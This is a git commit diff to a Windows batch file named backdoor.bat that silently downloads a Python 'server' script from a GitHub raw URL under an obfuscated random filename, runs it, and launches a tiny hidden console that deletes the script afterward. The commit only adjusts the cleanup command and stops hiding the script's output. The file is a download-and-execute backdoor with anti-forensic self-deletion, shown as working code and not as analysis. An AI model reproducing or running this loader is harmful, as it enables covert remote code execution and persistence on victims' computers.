34bda3962da3a07ff060411eeb08d479d06ecb2f
snowyxxdev <snowyware@gmail.com>
2024-10-06 10:55:23 +0100

    Update backdoor.bat

--- backdoor.bat
+++ backdoor.bat
@@ -4,6 +4,6 @@
 title console
 curl -s https://raw.githubusercontent.com/snowyxxdev/cloud-server/refs/heads/main/server.py -o AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py >nul 2>&1
 cls
-start cmd /c "mode con: cols=20 lines=1 && title console && timeout /t 2 /nobreak >nul && del AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py && title console && timeout /t 1 /nobreak >nul && cls && exit"
+start cmd /c "mode con: cols=20 lines=1 && title console && timeout /t 2 /nobreak >nul && del AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py && title console && exit"
 cls
-python AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py >nul 2>&1
+python AmKiPjdjUD82mKiPjdjUD82mKiPjdjUD82Jls.py
